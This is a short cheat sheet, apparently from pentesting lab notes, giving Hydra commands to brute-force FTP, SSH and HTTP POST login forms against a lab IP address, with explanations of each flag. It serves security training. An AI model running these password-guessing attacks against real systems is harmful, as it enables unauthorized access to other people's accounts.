# Hydra

#### FTP[​](broken-reference) <a href="#ftp" id="ftp"></a>

```
hydra -l user -P passlist.txt ftp://10.10.231.82
```

#### SSH[​](broken-reference) <a href="#ssh" id="ssh"></a>

```
hydra -l <username> -P <full path to pass> 10.10.231.82 -t 4 ssh
```

* `-l` is for the username
* `-P` Use a list of passwords
* `-t` specifies the number of threads to use

#### Post Web Form[​](broken-reference) <a href="#post-web-form" id="post-web-form"></a>

```
hydra -l <username> -P <wordlist> 10.10.231.82 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

* `-l` Single username
* `-P` indicates use the following passworrd list
* `http-post-form` indicates the type of form (post)
* `/login url` the login page URL
* `:username` the form field where the username is entered
* `^USER^` tells Hydra to use the username
* `password` the form field where the password is entered
* `^PASS^` tells Hydra to use the password list supplied earlier
* `Login` indicates to Hydra the Login failed message
* `Login Failed` is the login failure message that the form returns
* `F=incorrect` if this word appears on the page, its incorrect. It could be also something like this "Your username or password is incorrect."
* `-V` verbose output for every attempt
